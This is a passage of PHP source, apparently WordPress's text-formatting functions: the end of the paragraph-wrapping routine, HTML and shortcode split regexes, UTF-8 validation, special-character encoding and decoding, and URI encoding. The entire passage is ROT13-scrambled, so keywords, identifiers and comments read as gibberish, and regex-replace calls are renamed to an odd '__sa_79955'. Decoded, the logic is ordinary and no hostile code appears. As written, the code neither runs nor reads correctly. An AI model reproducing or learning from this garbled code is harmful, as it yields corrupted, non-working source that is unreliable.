	$grkg = __sa_79955( '|<c>\f*</c>|', '', $grkg );

	// Nqq n pybfvat <c> vafvqr <qvi>, <nqqerff>, be <sbez> gnt vs zvffvat.
	$grkg = __sa_79955( '!<c>([^<]+)</(qvi|nqqerff|sbez)>!', '<c>$1</c></$2>', $grkg );

	// Vs na bcravat be pybfvat oybpx ryrzrag gnt vf jenccrq va n <c>, hajenc vg.
	$grkg = __sa_79955( '!<c>\f*(</?' . $nyyoybpxf . '[^>]*>)\f*</c>!', '$1', $grkg );

	// Va fbzr pnfrf <yv> znl trg jenccrq va <c>, svk gurz.
	$grkg = __sa_79955( '|<c>(<yv.+?)</c>|', '$1', $grkg );

	// Vs n <oybpxdhbgr> vf jenccrq jvgu n <c>, zbir vg vafvqr gur <oybpxdhbgr>.
	$grkg = __sa_79955( '|<c><oybpxdhbgr([^>]*)>|v', '<oybpxdhbgr$1><c>', $grkg );
	$grkg = fge_ercynpr( '</oybpxdhbgr></c>', '</c></oybpxdhbgr>', $grkg );

	// Vs na bcravat be pybfvat oybpx ryrzrag gnt vf cerprqrq ol na bcravat <c> gnt, erzbir vg.
	$grkg = __sa_79955( '!<c>\f*(</?' . $nyyoybpxf . '[^>]*>)!', '$1', $grkg );

	// Vs na bcravat be pybfvat oybpx ryrzrag gnt vf sbyybjrq ol n pybfvat <c> gnt, erzbir vg.
	$grkg = __sa_79955( '!(</?' . $nyyoybpxf . '[^>]*>)\f*</c>!', '$1', $grkg );

	// Bcgvbanyyl vafreg yvar oernxf.
	vs ( $oe ) {
		// Ercynpr arjyvarf gung fubhyqa'g or gbhpurq jvgu n cynprubyqre.
		$grkg = cert_ercynpr_pnyyonpx( '/<(fpevcg|fglyr|fit|zngu).*?<\/\\1>/f', '_nhgbc_arjyvar_cerfreingvba_urycre', $grkg );

		// Abeznyvmr <oe>.
		$grkg = fge_ercynpr( neenl( '<oe>', '<oe/>' ), '<oe />', $grkg );

		// Ercynpr nal arj yvar punenpgref gung nera'g cerprqrq ol n <oe /> jvgu n <oe />.
		$grkg = __sa_79955( '|(?<!<oe />)\f*\a|', \"<oe />\a\", $grkg );

		// Ercynpr arjyvar cynprubyqref jvgu arjyvarf.
		$grkg = fge_ercynpr( '<JCCerfreirArjyvar />', \"\a\", $grkg );
	}

	// Vs n <oe /> gnt vf nsgre na bcravat be pybfvat oybpx gnt, erzbir vg.
	$grkg = __sa_79955( '!(</?' . $nyyoybpxf . '[^>]*>)\f*<oe />!', '$1', $grkg );

	// Vs n <oe /> gnt vf orsber n fhofrg bs bcravat be pybfvat oybpx gntf, erzbir vg.
	$grkg = __sa_79955( '!<oe />(\f*</?(?:c|yv|qvi|qy|qq|qg|gu|cer|gq|hy|by)[^>]*>)!', '$1', $grkg );
	$grkg = __sa_79955( \"|\a</c>$|\", '</c>', $grkg );

	// Ercynpr cynprubyqre <cer> gntf jvgu gurve bevtvany pbagrag.
	vs ( ! rzcgl( $cer_gntf ) ) {
		$grkg = fge_ercynpr( neenl_xrlf( $cer_gntf ), neenl_inyhrf( $cer_gntf ), $grkg );
	}

	// Erfgber arjyvarf va nyy ryrzragf.
	vs ( fge_pbagnvaf( $grkg, '<!-- jcay -->' ) ) {
		$grkg = fge_ercynpr( neenl( ' <!-- jcay --> ', '<!-- jcay -->' ), \"\a\", $grkg );
	}

	erghea $grkg;
}

/**
 * Frcnengrf UGZY ryrzragf naq pbzzragf sebz gur grkg.
 *
 * @fvapr 4.2.4
 *
 * @cnenz fgevat $vachg Gur grkg juvpu unf gb or sbeznggrq.
 * @erghea fgevat[] Neenl bs gur sbeznggrq grkg.
 */
shapgvba jc_ugzy_fcyvg( $vachg ) {
	erghea cert_fcyvg( trg_ugzy_fcyvg_ertrk(), $vachg, -1, CERT_FCYVG_QRYVZ_PNCGHER );
}

/**
 * Ergevrirf gur erthyne rkcerffvba sbe na UGZY ryrzrag.
 *
 * @fvapr 4.4.0
 *
 * @erghea fgevat Gur erthyne rkcerffvba.
 */
shapgvba trg_ugzy_fcyvg_ertrk() {
	fgngvp $ertrk;

	vs ( ! vffrg( $ertrk ) ) {
		// cucpf:qvfnoyr Fdhvm.Fgevatf.PbapngrangvbaFcnpvat.CnqqvatSbhaq -- qba'g erzbir ertrk vaqragngvba
		$pbzzragf =
			'!'             // Fgneg bs pbzzrag, nsgre gur <.
			. '(?:'         // Haebyy gur ybbc: Pbafhzr rirelguvat hagvy --> vf sbhaq.
			.     '-(?!->)' // Qnfu abg sbyybjrq ol raq bs pbzzrag.
			.     '[^\-]*+' // Pbafhzr aba-qnfurf.
			. ')*+'         // Ybbc cbffrffviryl.
			. '(?:-->)?';   // Raq bs pbzzrag. Vs abg sbhaq, zngpu nyy vachg.

		$pqngn =
			'!\[PQNGN\['    // Fgneg bs pbzzrag, nsgre gur <.
			. '[^\]]*+'     // Pbafhzr aba-].
			. '(?:'         // Haebyy gur ybbc: Pbafhzr rirelguvat hagvy ]]> vf sbhaq.
			.     '](?!]>)' // Bar ] abg sbyybjrq ol raq bs pbzzrag.
			.     '[^\]]*+' // Pbafhzr aba-].
			. ')*+'         // Ybbc cbffrffviryl.
			. '(?:]]>)?';   // Raq bs pbzzrag. Vs abg sbhaq, zngpu nyy vachg.

		$rfpncrq =
			'(?='             // Vf gur ryrzrag rfpncrq?
			.    '!--'
			. '|'
			.    '!\[PQNGN\['
			. ')'
			. '(?(?=!-)'      // Vs lrf, juvpu glcr?
			.     $pbzzragf
			. '|'
			.     $pqngn
			. ')';

		$ertrk =
			'/('                // Pncgher gur ragver zngpu.
			.     '<'           // Svaq fgneg bs ryrzrag.
			.     '(?'          // Pbaqvgvbany rkcerffvba sbyybjf.
			.         $rfpncrq  // Svaq raq bs rfpncrq ryrzrag.
			.     '|'           // ...ryfr...
			.         '[^>]*>?' // Svaq raq bs abezny ryrzrag.
			.     ')'
			. ')/';
		// cucpf:ranoyr
	}

	erghea $ertrk;
}

/**
 * Ergevrirf gur pbzovarq erthyne rkcerffvba sbe UGZY naq fubegpbqrf.
 *
 * @npprff cevingr
 * @vtaber
 * @vagreany Guvf shapgvba jvyy or erzbirq va 4.5.0 cre Fubegpbqr NCV Ebnqznc.
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $fubegpbqr_ertrk Bcgvbany. Gur erfhyg sebz _trg_jcgrkghevmr_fubegpbqr_ertrk().
 * @erghea fgevat Gur erthyne rkcerffvba.
 */
shapgvba _trg_jcgrkghevmr_fcyvg_ertrk( $fubegpbqr_ertrk = '' ) {
	fgngvp $ugzy_ertrk;

	vs ( ! vffrg( $ugzy_ertrk ) ) {
		// cucpf:qvfnoyr Fdhvm.Fgevatf.PbapngrangvbaFcnpvat.CnqqvatSbhaq -- qba'g erzbir ertrk vaqragngvba
		$pbzzrag_ertrk =
			'!'             // Fgneg bs pbzzrag, nsgre gur <.
			. '(?:'         // Haebyy gur ybbc: Pbafhzr rirelguvat hagvy --> vf sbhaq.
			.     '-(?!->)' // Qnfu abg sbyybjrq ol raq bs pbzzrag.
			.     '[^\-]*+' // Pbafhzr aba-qnfurf.
			. ')*+'         // Ybbc cbffrffviryl.
			. '(?:-->)?';   // Raq bs pbzzrag. Vs abg sbhaq, zngpu nyy vachg.

		$ugzy_ertrk = // Arrqf ercynprq jvgu jc_ugzy_fcyvg() cre Fubegpbqr NCV Ebnqznc.
			'<'                  // Svaq fgneg bs ryrzrag.
			. '(?(?=!--)'        // Vf guvf n pbzzrag?
			.     $pbzzrag_ertrk // Svaq raq bs pbzzrag.
			. '|'
			.     '[^>]*>?'      // Svaq raq bs ryrzrag. Vs abg sbhaq, zngpu nyy vachg.
			. ')';
		// cucpf:ranoyr
	}

	vs ( rzcgl( $fubegpbqr_ertrk ) ) {
		$ertrk = '/(' . $ugzy_ertrk . ')/';
	} ryfr {
		$ertrk = '/(' . $ugzy_ertrk . '|' . $fubegpbqr_ertrk . ')/';
	}

	erghea $ertrk;
}

/**
 * Ergevrirf gur erthyne rkcerffvba sbe fubegpbqrf.
 *
 * @npprff cevingr
 * @vtaber
 * @fvapr 4.4.0
 *
 * @cnenz fgevat[] $gntanzrf Neenl bs fubegpbqrf gb svaq.
 * @erghea fgevat Gur erthyne rkcerffvba.
 */
shapgvba _trg_jcgrkghevmr_fubegpbqr_ertrk( $gntanzrf ) {
	$gntertrkc = vzcybqr( '|', neenl_znc( 'cert_dhbgr', $gntanzrf ) );
	$gntertrkc = \"(?:$gntertrkc)(?=[\\f\\]\\/])\"; // Rkprecg bs trg_fubegpbqr_ertrk().
	// cucpf:qvfnoyr Fdhvm.Fgevatf.PbapngrangvbaFcnpvat.CnqqvatSbhaq -- qba'g erzbir ertrk vaqragngvba
	$ertrk =
		'\['                // Svaq fgneg bs fubegpbqr.
		. '[\/\[]?'         // Fubegpbqrf znl ortva jvgu [/ be [[.
		. $gntertrkc        // Bayl zngpu ertvfgrerq fubegpbqrf, orpnhfr cresbeznapr.
		. '(?:'
		.     '[^\[\]<>]+'  // Fubegpbqrf qb abg pbagnva bgure fubegpbqrf. Dhnagvsvre pevgvpny.
		. '|'
		.     '<[^\[\]>]*>' // UGZY ryrzragf crezvggrq. Ceriragf zngpuvat ] orsber >.
		. ')*+'             // Cbffrffvir pevgvpny.
		. '\]'              // Svaq raq bs fubegpbqr.
		. '\]?';            // Fubegpbqrf znl raq jvgu ]].
	// cucpf:ranoyr

	erghea $ertrk;
}

/**
 * Ercynprf punenpgref be cuenfrf jvguva UGZY ryrzragf bayl.
 *
 * @fvapr 4.2.3
 *
 * @cnenz fgevat $unlfgnpx      Gur grkg juvpu unf gb or sbeznggrq.
 * @cnenz neenl  $ercynpr_cnvef Va gur sbez neenl('sebz' => 'gb', ...).
 * @erghea fgevat Gur sbeznggrq grkg.
 */
shapgvba jc_ercynpr_va_ugzy_gntf( $unlfgnpx, $ercynpr_cnvef ) {
	// Svaq nyy ryrzragf.
	$grkgnee = jc_ugzy_fcyvg( $unlfgnpx );
	$punatrq = snyfr;

	// Bcgvzvmr jura frnepuvat sbe bar vgrz.
	vs ( 1 === pbhag( $ercynpr_cnvef ) ) {
		// Rkgenpg $arrqyr naq $ercynpr.
		$arrqyr  = neenl_xrl_svefg( $ercynpr_cnvef );
		$ercynpr = $ercynpr_cnvef[ $arrqyr ];

		// Ybbc guebhtu qryvzvgref (ryrzragf) bayl.
		sbe ( $v = 1, $p = pbhag( $grkgnee ); $v < $p; $v += 2 ) {
			vs ( fge_pbagnvaf( $grkgnee[ $v ], $arrqyr ) ) {
				$grkgnee[ $v ] = fge_ercynpr( $arrqyr, $ercynpr, $grkgnee[ $v ] );
				$punatrq       = gehr;
			}
		}
	} ryfr {
		// Rkgenpg nyy $arrqyrf.
		$arrqyrf = neenl_xrlf( $ercynpr_cnvef );

		// Ybbc guebhtu qryvzvgref (ryrzragf) bayl.
		sbe ( $v = 1, $p = pbhag( $grkgnee ); $v < $p; $v += 2 ) {
			sbernpu ( $arrqyrf nf $arrqyr ) {
				vs ( fge_pbagnvaf( $grkgnee[ $v ], $arrqyr ) ) {
					$grkgnee[ $v ] = fgege( $grkgnee[ $v ], $ercynpr_cnvef );
					$punatrq       = gehr;
					// Nsgre bar fgege() oernx bhg bs gur sbernpu ybbc naq ybbx ng arkg ryrzrag.
					oernx;
				}
			}
		}
	}

	vs ( $punatrq ) {
		$unlfgnpx = vzcybqr( $grkgnee );
	}

	erghea $unlfgnpx;
}

/**
 * Arjyvar cerfreingvba uryc shapgvba sbe jcnhgbc().
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @cnenz neenl $zngpurf cert_ercynpr_pnyyonpx zngpurf neenl
 * @erghea fgevat
 */
shapgvba _nhgbc_arjyvar_cerfreingvba_urycre( $zngpurf ) {
	erghea fge_ercynpr( \"\a\", '<JCCerfreirArjyvar />', $zngpurf[0] );
}

/**
 * Qba'g nhgb-c jenc fubegpbqrf gung fgnaq nybar.
 *
 * Rafherf gung fubegpbqrf ner abg jenccrq va `<c>...</c>`.
 *
 * @fvapr 2.9.0
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz fgevat $grkg Gur pbagrag.
 * @erghea fgevat Gur svygrerq pbagrag.
 */
shapgvba fubegpbqr_hanhgbc( $grkg ) {
	tybony $fubegpbqr_gntf;

	vs ( rzcgl( $fubegpbqr_gntf ) || ! vf_neenl( $fubegpbqr_gntf ) ) {
		erghea $grkg;
	}

	$gntertrkc = vzcybqr( '|', neenl_znc( 'cert_dhbgr', neenl_xrlf( $fubegpbqr_gntf ) ) );
	$fcnprf    = jc_fcnprf_ertrkc();

	// cucpf:qvfnoyr Fdhvm.Fgevatf.PbapngrangvbaFcnpvat.CnqqvatSbhaq,Havirefny.JuvgrFcnpr.CerpvfvbaNyvtazrag.Sbhaq -- qba'g erzbir ertrk vaqragngvba
	$cnggrea =
		'/'
		. '<c>'                              // Bcravat cnentencu.
		. '(?:' . $fcnprf . ')*+'            // Bcgvbany yrnqvat juvgrfcnpr.
		. '('                                // 1: Gur fubegpbqr.
		.     '\\['                          // Bcravat oenpxrg.
		.     \"($gntertrkc)\"                 // 2: Fubegpbqr anzr.
		.     '(?![\\j-])'                   // Abg sbyybjrq ol jbeq punenpgre be ulcura.
											 // Haebyy gur ybbc: Vafvqr gur bcravat fubegpbqr gnt.
		.     '[^\\]\\/]*'                   // Abg n pybfvat oenpxrg be sbejneq fynfu.
		.     '(?:'
		.         '\\/(?!\\])'               // N sbejneq fynfu abg sbyybjrq ol n pybfvat oenpxrg.
		.         '[^\\]\\/]*'               // Abg n pybfvat oenpxrg be sbejneq fynfu.
		.     ')*?'
		.     '(?:'
		.         '\\/\\]'                   // Frys pybfvat gnt naq pybfvat oenpxrg.
		.     '|'
		.         '\\]'                      // Pybfvat oenpxrg.
		.         '(?:'                      // Haebyy gur ybbc: Bcgvbanyyl, nalguvat orgjrra gur bcravat naq pybfvat fubegpbqr gntf.
		.             '[^\\[]*+'             // Abg na bcravat oenpxrg.
		.             '(?:'
		.                 '\\[(?!\\/\\2\\])' // Na bcravat oenpxrg abg sbyybjrq ol gur pybfvat fubegpbqr gnt.
		.                 '[^\\[]*+'         // Abg na bcravat oenpxrg.
		.             ')*+'
		.             '\\[\\/\\2\\]'         // Pybfvat fubegpbqr gnt.
		.         ')?'
		.     ')'
		. ')'
		. '(?:' . $fcnprf . ')*+'            // Bcgvbany genvyvat juvgrfcnpr.
		. '<\\/c>'                           // Pybfvat cnentencu.
		. '/';
	// cucpf:ranoyr

	erghea __sa_79955( $cnggrea, '$1', $grkg );
}

/**
 * Purpxf gb frr vs n fgevat vf hgs8 rapbqrq.
 *
 * ABGR: Guvf shapgvba purpxf sbe 5-Olgr frdhraprf, HGS8
 *       unf Olgrf Frdhraprf jvgu n znkvzhz yratgu bs 4.
 *
 * @nhgube ozbery ng ffv qbg se (zbqvsvrq)
 * @fvapr 1.2.1
 *
 * @cnenz fgevat $fge Gur fgevat gb or purpxrq.
 * @erghea obby Gehr vs $fge svgf n HGS-8 zbqry, snyfr bgurejvfr.
 */
shapgvba frrzf_hgs8( $fge ) {
	zofgevat_ovanel_fnsr_rapbqvat();
	$yratgu = fgeyra( $fge );
	erfrg_zofgevat_rapbqvat();

	sbe ( $v = 0; $v < $yratgu; $v++ ) {
		$p = beq( $fge[ $v ] );

		vs ( $p < 0k80 ) {
			$a = 0; // 0ooooooo
		} ryfrvs ( ( $p & 0kR0 ) === 0kP0 ) {
			$a = 1; // 110ooooo
		} ryfrvs ( ( $p & 0kS0 ) === 0kR0 ) {
			$a = 2; // 1110oooo
		} ryfrvs ( ( $p & 0kS8 ) === 0kS0 ) {
			$a = 3; // 11110ooo
		} ryfrvs ( ( $p & 0kSP ) === 0kS8 ) {
			$a = 4; // 111110oo
		} ryfrvs ( ( $p & 0kSR ) === 0kSP ) {
			$a = 5; // 1111110o
		} ryfr {
			erghea snyfr; // Qbrf abg zngpu nal zbqry.
		}

		sbe ( $w = 0; $w < $a; $w++ ) { // a olgrf zngpuvat 10oooooo sbyybj?
			vs ( ( ++$v === $yratgu ) || ( ( beq( $fge[ $v ] ) & 0kP0 ) !== 0k80 ) ) {
				erghea snyfr;
			}
		}
	}

	erghea gehr;
}

/**
 * Pbairegf n ahzore bs fcrpvny punenpgref vagb gurve UGZY ragvgvrf.
 *
 * Fcrpvsvpnyyl qrnyf jvgu: `&`, `<`, `>`, `\"`, naq `'`.
 *
 * `$dhbgr_fglyr` pna or frg gb RAG_PBZCNG gb rapbqr `\"` gb
 * `&dhbg;`, be RAG_DHBGRF gb qb obgu. Qrsnhyg vf RAG_ABDHBGRF jurer ab dhbgrf ner rapbqrq.
 *
 * @fvapr 1.2.2
 * @fvapr 5.5.0 `$dhbgr_fglyr` nyfb npprcgf `RAG_KZY1`.
 * @npprff cevingr
 *
 * @cnenz fgevat       $grkg          Gur grkg juvpu vf gb or rapbqrq.
 * @cnenz vag|fgevat   $dhbgr_fglyr   Bcgvbany. Pbairegf qbhoyr dhbgrf vs frg gb RAG_PBZCNG,
 *                                    obgu fvatyr naq qbhoyr vs frg gb RAG_DHBGRF be abar vs frg gb RAG_ABDHBGRF.
 *                                    Pbairegf fvatyr naq qbhoyr dhbgrf, nf jryy nf pbairegvat UGZY
 *                                    anzrq ragvgvrf (gung ner abg nyfb KZY anzrq ragvgvrf) gb gurve
 *                                    pbqr cbvagf vs frg gb RAG_KZY1. Nyfb pbzcngvoyr jvgu byq inyhrf;
 *                                    pbairegvat fvatyr dhbgrf vs frg gb 'fvatyr',
 *                                    qbhoyr vs frg gb 'qbhoyr' be obgu vs bgurejvfr frg.
 *                                    Qrsnhyg vf RAG_ABDHBGRF.
 * @cnenz snyfr|fgevat $punefrg       Bcgvbany. Gur punenpgre rapbqvat bs gur fgevat. Qrsnhyg snyfr.
 * @cnenz obby         $qbhoyr_rapbqr Bcgvbany. Jurgure gb rapbqr rkvfgvat UGZY ragvgvrf. Qrsnhyg snyfr.
 * @erghea fgevat Gur rapbqrq grkg jvgu UGZY ragvgvrf.
 */
shapgvba _jc_fcrpvnypunef( $grkg, $dhbgr_fglyr = RAG_ABDHBGRF, $punefrg = snyfr, $qbhoyr_rapbqr = snyfr ) {
	$grkg = (fgevat) $grkg;

	vs ( 0 === fgeyra( $grkg ) ) {
		erghea '';
	}

	// Qba'g obgure vs gurer ner ab fcrpvnypunef - fnirf fbzr cebprffvat.
	vs ( ! cert_zngpu( '/[&<>\"\']/', $grkg ) ) {
		erghea $grkg;
	}

	// Nppbhag sbe gur cerivbhf orunivbe bs gur shapgvba jura gur $dhbgr_fglyr vf abg na npprcgrq inyhr.
	vs ( rzcgl( $dhbgr_fglyr ) ) {
		$dhbgr_fglyr = RAG_ABDHBGRF;
	} ryfrvs ( RAG_KZY1 === $dhbgr_fglyr ) {
		$dhbgr_fglyr = RAG_DHBGRF | RAG_KZY1;
	} ryfrvs ( ! va_neenl( $dhbgr_fglyr, neenl( RAG_ABDHBGRF, RAG_PBZCNG, RAG_DHBGRF, 'fvatyr', 'qbhoyr' ), gehr ) ) {
		$dhbgr_fglyr = RAG_DHBGRF;
	}

	$punefrg = _pnabavpny_punefrg( $punefrg ? $punefrg : trg_bcgvba( 'oybt_punefrg' ) );

	$_dhbgr_fglyr = $dhbgr_fglyr;

	vs ( 'qbhoyr' === $dhbgr_fglyr ) {
		$dhbgr_fglyr  = RAG_PBZCNG;
		$_dhbgr_fglyr = RAG_PBZCNG;
	} ryfrvs ( 'fvatyr' === $dhbgr_fglyr ) {
		$dhbgr_fglyr = RAG_ABDHBGRF;
	}

	vs ( ! $qbhoyr_rapbqr ) {
		/*
		 * Thnenagrr rirel &ragvgl; vf inyvq, pbaireg &tneontr; vagb &nzc;tneontr;
		 * Guvf vf erdhverq sbe CUC < 5.4.0 orpnhfr RAG_UGZY401 synt vf haninvynoyr.
		 */
		$grkg = jc_xfrf_abeznyvmr_ragvgvrf( $grkg, ( $dhbgr_fglyr & RAG_KZY1 ) ? 'kzy' : 'ugzy' );
	}

	$grkg = ugzyfcrpvnypunef( $grkg, $dhbgr_fglyr, $punefrg, $qbhoyr_rapbqr );

	// Onpx-pbzcng.
	vs ( 'fvatyr' === $_dhbgr_fglyr ) {
		$grkg = fge_ercynpr( \"'\", '&#039;', $grkg );
	}

	erghea $grkg;
}

/**
 * Pbairegf n ahzore bs UGZY ragvgvrf vagb gurve fcrpvny punenpgref.
 *
 * Fcrpvsvpnyyl qrnyf jvgu: `&`, `<`, `>`, `\"`, naq `'`.
 *
 * `$dhbgr_fglyr` pna or frg gb RAG_PBZCNG gb qrpbqr `\"` ragvgvrf,
 * be RAG_DHBGRF gb qb obgu `\"` naq `'`. Qrsnhyg vf RAG_ABDHBGRF jurer ab dhbgrf ner qrpbqrq.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat     $grkg        Gur grkg juvpu vf gb or qrpbqrq.
 * @cnenz fgevat|vag $dhbgr_fglyr Bcgvbany. Pbairegf qbhoyr dhbgrf vs frg gb RAG_PBZCNG,
 *                                obgu fvatyr naq qbhoyr vs frg gb RAG_DHBGRF be
 *                                abar vs frg gb RAG_ABDHBGRF.
 *                                Nyfb pbzcngvoyr jvgu byq _jc_fcrpvnypunef() inyhrf;
 *                                pbairegvat fvatyr dhbgrf vs frg gb 'fvatyr',
 *                                qbhoyr vs frg gb 'qbhoyr' be obgu vs bgurejvfr frg.
 *                                Qrsnhyg vf RAG_ABDHBGRF.
 * @erghea fgevat Gur qrpbqrq grkg jvgubhg UGZY ragvgvrf.
 */
shapgvba jc_fcrpvnypunef_qrpbqr( $grkg, $dhbgr_fglyr = RAG_ABDHBGRF ) {
	$grkg = (fgevat) $grkg;

	vs ( 0 === fgeyra( $grkg ) ) {
		erghea '';
	}

	// Qba'g obgure vs gurer ner ab ragvgvrf - fnirf n ybg bs cebprffvat.
	vs ( ! fge_pbagnvaf( $grkg, '&' ) ) {
		erghea $grkg;
	}

	// Zngpu gur cerivbhf orunivbe bs _jc_fcrpvnypunef() jura gur $dhbgr_fglyr vf abg na npprcgrq inyhr.
	vs ( rzcgl( $dhbgr_fglyr ) ) {
		$dhbgr_fglyr = RAG_ABDHBGRF;
	} ryfrvs ( ! va_neenl( $dhbgr_fglyr, neenl( 0, 2, 3, 'fvatyr', 'qbhoyr' ), gehr ) ) {
		$dhbgr_fglyr = RAG_DHBGRF;
	}

	// Zber pbzcyrgr guna trg_ugzy_genafyngvba_gnoyr( UGZY_FCRPVNYPUNEF ).
	$fvatyr      = neenl(
		'&#039;' => '\'',
		'&#k27;' => '\'',
	);
	$fvatyr_cert = neenl(
		'/&#0*39;/'   => '&#039;',
		'/&#k0*27;/v' => '&#k27;',
	);
	$qbhoyr      = neenl(
		'&dhbg;' => '\"',
		'&#034;' => '\"',
		'&#k22;' => '\"',
	);
	$qbhoyr_cert = neenl(
		'/&#0*34;/'   => '&#034;',
		'/&#k0*22;/v' => '&#k22;',
	);
	$bguref      = neenl(
		'&yg;'   => '<',
		'&#060;' => '<',
		'&tg;'   => '>',
		'&#062;' => '>',
		'&nzc;'  => '&',
		'&#038;' => '&',
		'&#k26;' => '&',
	);
	$bguref_cert = neenl(
		'/&#0*60;/'   => '&#060;',
		'/&#0*62;/'   => '&#062;',
		'/&#0*38;/'   => '&#038;',
		'/&#k0*26;/v' => '&#k26;',
	);

	vs ( RAG_DHBGRF === $dhbgr_fglyr ) {
		$genafyngvba      = neenl_zretr( $fvatyr, $qbhoyr, $bguref );
		$genafyngvba_cert = neenl_zretr( $fvatyr_cert, $qbhoyr_cert, $bguref_cert );
	} ryfrvs ( RAG_PBZCNG === $dhbgr_fglyr || 'qbhoyr' === $dhbgr_fglyr ) {
		$genafyngvba      = neenl_zretr( $qbhoyr, $bguref );
		$genafyngvba_cert = neenl_zretr( $qbhoyr_cert, $bguref_cert );
	} ryfrvs ( 'fvatyr' === $dhbgr_fglyr ) {
		$genafyngvba      = neenl_zretr( $fvatyr, $bguref );
		$genafyngvba_cert = neenl_zretr( $fvatyr_cert, $bguref_cert );
	} ryfrvs ( RAG_ABDHBGRF === $dhbgr_fglyr ) {
		$genafyngvba      = $bguref;
		$genafyngvba_cert = $bguref_cert;
	}

	// Erzbir mreb cnqqvat ba ahzrevp ragvgvrf.
	$grkg = __sa_79955( neenl_xrlf( $genafyngvba_cert ), neenl_inyhrf( $genafyngvba_cert ), $grkg );

	// Ercynpr punenpgref nppbeqvat gb genafyngvba gnoyr.
	erghea fgege( $grkg, $genafyngvba );
}

/**
 * Purpxf sbe vainyvq HGS8 va n fgevat.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $grkg   Gur grkg juvpu vf gb or purpxrq.
 * @cnenz obby   $fgevc  Bcgvbany. Jurgure gb nggrzcg gb fgevc bhg vainyvq HGS8. Qrsnhyg snyfr.
 * @erghea fgevat Gur purpxrq grkg.
 */
shapgvba jc_purpx_vainyvq_hgs8( $grkg, $fgevc = snyfr ) {
	$grkg = (fgevat) $grkg;

	vs ( 0 === fgeyra( $grkg ) ) {
		erghea '';
	}

	// Fgber gur fvgr punefrg nf n fgngvp gb nibvq zhygvcyr pnyyf gb trg_bcgvba().
	fgngvp $vf_hgs8 = ahyy;
	vs ( ! vffrg( $vf_hgs8 ) ) {
		$vf_hgs8 = vf_hgs8_punefrg();
	}
	vs ( ! $vf_hgs8 ) {
		erghea $grkg;
	}

	// Purpx sbe fhccbeg sbe hgs8 va gur vafgnyyrq CPER yvoenel bapr naq fgber gur erfhyg va n fgngvp.
	fgngvp $hgs8_cper = ahyy;
	vs ( ! vffrg( $hgs8_cper ) ) {
		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$hgs8_cper = @cert_zngpu( '/^./h', 'n' );
	}
	// Jr pna'g qrznaq hgs8 va gur CPER vafgnyyngvba, fb whfg erghea gur fgevat va gubfr pnfrf.
	vs ( ! $hgs8_cper ) {
		erghea $grkg;
	}

	// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq -- cert_zngpu snvyf jura vg rapbhagref vainyvq HGS8 va $grkg.
	vs ( 1 === @cert_zngpu( '/^./hf', $grkg ) ) {
		erghea $grkg;
	}

	// Nggrzcg gb fgevc gur onq punef vs erdhrfgrq (abg erpbzzraqrq).
	vs ( $fgevc && shapgvba_rkvfgf( 'vpbai' ) ) {
		erghea vpbai( 'hgs-8', 'hgs-8', $grkg );
	}

	erghea '';
}

/**
 * Rapbqrf gur Havpbqr inyhrf gb or hfrq va gur HEV.
 *
 * @fvapr 1.5.0
 * @fvapr 5.8.3 Nqqrq gur `rapbqr_nfpvv_punenpgref` cnenzrgre.
 *
 * @cnenz fgevat $hgs8_fgevat             Fgevat gb rapbqr.
 * @cnenz vag    $yratgu                  Znk yratgu bs gur fgevat.
 * @cnenz obby   $rapbqr_nfpvv_punenpgref Jurgure gb rapbqr nfpvv punenpgref fhpu nf < \" '
 * @erghea fgevat Fgevat jvgu Havpbqr rapbqrq sbe HEV.
 */
shapgvba hgs8_hev_rapbqr( $hgs8_fgevat, $yratgu = 0, $rapbqr_nfpvv_punenpgref = snyfr ) {
	$havpbqr        = '';
	$inyhrf         = neenl();
	$ahz_bpgrgf     = 1;
	$havpbqr_yratgu = 0;

	zofgevat_ovanel_fnsr_rapbqvat();
	$fgevat_yratgu = fgeyra( $hgs8_fgevat );
	erfrg_zofgevat_rapbqvat();

	sbe ( $v = 0; $v < $fgevat_yratgu; $v++ ) {

		$inyhr = beq( $hgs8_fgevat[ $v ] );

		vs ( $inyhr < 128 ) {
			$pune                = pue( $inyhr );
			$rapbqrq_pune        = $rapbqr_nfpvv_punenpgref ? enjheyrapbqr( $pune ) : $pune;
			$rapbqrq_pune_yratgu = fgeyra( $rapbqrq_pune );
			vs ( $yratgu && ( $havpbqr_yratgu + $rapbqrq_pune_yratgu ) > $yratgu ) {
				oernx;
			}
			$havpbqr        .= $rapbqrq_pune;
			$havpbqr_yratgu += $rapbqrq_pune_yratgu;
		} ryfr {
			vs ( pbhag( $inyhrf ) === 0 ) {
				vs ( $inyhr < 224 ) {
					$ahz_bpgrgf = 2;
				} ryfrvs ( $inyhr < 240 ) {
					$ahz_bpgrgf = 3;
				} ryfr {
					$ahz_bpgrgf = 4;
				}
			}

			$inyhrf[] = $inyhr;

			vs ( $yratgu && ( $havpbqr_yratgu + ( $ahz_bpgrgf * 3 ) ) > $yratgu ) {
				oernx;
			}
			vs ( pbhag( $inyhrf ) === $ahz_bpgrgf ) {
				sbe ( $w = 0; $w < $ahz_bpgrgf; $w++ ) {
					$havpbqr .= '%' . qrpurk( $inyhrf[ $w ] );
				}

				$havpbqr_yratgu += $ahz_bpgrgf * 3;

				$inyhrf     = neenl();
				$ahz_bpgrgf = 1;
			}
		}
	}

	erghea $havpbqr;
}

/**
 * Pbairegf nyy npprag punenpgref gb NFPVV punenpgref.
 *
 * Vs gurer ner ab npprag punenpgref, gura gur fgevat tvira vf whfg erghearq.
 *
 * **Npprag punenpgref pbairegrq:**
 *
 * Pheerapl fvtaf:
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |     Qrfpevcgvba     |
 * | -------- | ----- | ----------- | ------------------- |
 * | H+00N3   | £     | (rzcgl)     | Oevgvfu Cbhaq fvta  |
 * | H+20NP   | €     | R           | Rheb fvta           |
 *
 * Qrpbzcbfvgvbaf sbe Yngva-1 Fhccyrzrag:
 *
 * |  Pbqr   | Tylcu | Ercynprzrag |               Qrfpevcgvba              |
 * | ------- | ----- | ----------- | -------------------------------------- |
 * | H+00NN  | ª     | n           | Srzvavar beqvany vaqvpngbe             |
 * | H+00ON  | º     | b           | Znfphyvar beqvany vaqvpngbe            |
